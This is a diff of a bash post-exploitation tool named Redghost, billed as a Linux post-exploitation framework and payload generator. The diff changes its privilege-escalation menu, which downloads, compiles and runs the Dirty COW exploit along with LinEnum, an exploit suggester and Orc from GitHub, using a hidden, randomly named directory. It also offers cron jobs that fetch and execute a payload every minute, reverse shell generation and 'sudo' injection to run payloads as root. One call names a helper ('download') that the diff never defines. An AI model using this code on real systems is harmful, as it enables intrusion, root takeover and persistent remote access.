@@ -1,3 +1,4 @@
+#!/bin/bash
 INPUT=/tmp/menu.sh.$$
 OUTPUT=/tmp/output.sh.$$
 trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
@@ -152,6 +153,7 @@ cron(){
 		echo -e "\nAdded cron job to crontab\n"
 		enter
 	}
+
 	options=("Echo generated crontab command to download and execute payload every minute" "Add cron job to this system to download and execute payload every minute" "Return to main menu")
 	dispatch_table=(
 		["Echo generated crontab command to download and execute payload every minute"]=cmmand
@@ -164,9 +166,11 @@ cron(){
 
 
 escalate(){
+	randname=$HOME/.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
+	direct=${randname}
+
 	conmethods(){
 		cat <<-EOF
-
 
 			This function attempts to:
 
@@ -203,7 +207,8 @@ escalate(){
 			$? 2>/dev/null
 			eval "${methods[method]}"
 			if (("$?" == 0)); then
-				echo -e "${methods[method]}\n[*] Method Succeded [*]\n"
+				echo -e "${methods[method]}"
+				echo -e "[*] Method Succeded [*]\n"
 				sleep 1
 			else
 				echo -e "[*] Method Failed! [*]\n"
@@ -224,43 +229,40 @@ escalate(){
 		return
 	}
 
+	downld(){
+		wget -P ${direct} $1 2>/dev/null
+		chmod +x ${direct}/*
+	}
 
 	dirty(){
 		echo -e "This may take some time...\n"
-		wget -P $HOME https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c 2>/dev/null
-		gcc -pthread $HOME/dirty.c -o $HOME/dirty -lcrypt
-		$HOME/./dirty
-		rm -rf $HOME/dirty*
-		enter
+		download https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
+		gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
+		${direct}/./dirty
 	}
 
 
 	linprivesc(){
-		wget -P $HOME https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py 2>/dev/null
-		python $HOME/./linuxprivchecker.py
-		rm $HOME/linuxprivchecker.py
-		enter
-	
+		downld https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+		python ${direct}/./linuxprivchecker.py
 	}
 
 
 	exploitsug(){
-		wget -P $HOME https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 2>/dev/null
-		chmod +x $HOME/les.sh; $HOME/./les.sh; rm $HOME/les.sh
-		enter
+		downld https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+		${direct}/./linux-exploit-suggester.sh
 	}
 
 
 	lineum(){
-		wget -P $HOME https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
-		chmod +x $HOME/LinEnum.sh; $HOME/./LinEnum.sh; rm $HOME/LinEnum.sh
-		enter
+		downld https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+		${direct}/./LinEnum.sh
 	}
 
 
 	Orc(){
-		wget -P $HOME https://github.com/zMarch/Orc/archive/master.zip 2>/dev/null
-		unzip -q $HOME/master.zip -d $HOME/Orc
+		downld https://github.com/zMarch/Orc/archive/master.zip
+		unzip -q ${direct}/master.zip -d ${direct}/Orc
 
 		cat <<-EOF
 
@@ -270,10 +272,8 @@ escalate(){
 
 			EOF
 
-		ENV=$HOME/Orc/Orc-master/o.rc sh -i
-		rm -rf $HOME/Orc
+		ENV=${direct}/Orc/Orc-master/o.rc sh -i
 	}
-
 
 	options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run Orc" "Return to main menu")
 	dispatch_table=(
@@ -288,6 +288,14 @@ escalate(){
 		)
 
 	prompt "How would you like to get root?" options dispatch_table
+	
+	rm -rf ${direct}
+
+	if (("$REPLY" == 7)); then
+		return
+	else
+		enter
+	fi
 }
 
 
@@ -412,8 +420,8 @@ banip(){
 while true
 do
 
-dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.. v2.0" \
---title "[ R E D G H O S T - P O S T  E X P L O I T - T O O L ]" \
+dialog --clear --nocancel --backtitle "\Zb\Z0Coded by d4rkst4t1c.. v2.0" \
+--colors --title "\Zb\Z0[\Zb\Z1 R E D G H O S T \Zb\Z0- \Zb\Z1P O S T  E X P L O I T \Zb\Z0- \Zb\Z1T O O L \Zb\Z0]" \
 --menu "Linux post exploitation framework and payload generator." 18 60 11 \
 Payloads "Generate Reverse Shells" \
 SudoInject "Inject 'sudo' to run payload as root" \
